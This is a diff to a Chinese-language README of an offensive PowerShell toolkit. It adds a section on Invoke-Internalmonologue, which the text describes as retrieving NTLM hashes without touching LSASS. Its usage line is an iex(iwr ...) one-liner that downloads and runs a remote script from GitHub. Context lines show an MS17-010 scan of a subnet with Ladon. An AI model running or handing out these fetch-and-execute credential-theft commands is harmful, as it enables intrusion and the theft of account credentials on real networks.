@@ -43,6 +43,17 @@ invoke-ladon "192.168.1.8/24 MS17010" > MS17010.txt
 或者直接把调用命令放在脚本最后一行
 
 ![image](https://user-images.githubusercontent.com/89376703/197330378-fff9e947-3c5e-47b8-b4ae-02576fdee671.png)
+# Invoke-Internalmonologue
+
+Internalmonologue
+
+Internalmonologue：在不接触 LSASS 的情况下检索 NTLM 哈希:https://github.com/eladshamir/Internal-Monologue
+
+用法：
+```
+iex(iwr -UseBasicParsing https://raw.githubusercontent.com/INotGreen/Invoke-SharpOffensive/main/Invoke-Internalmonologue.ps1)
+```
+
 
 
 ### 总结
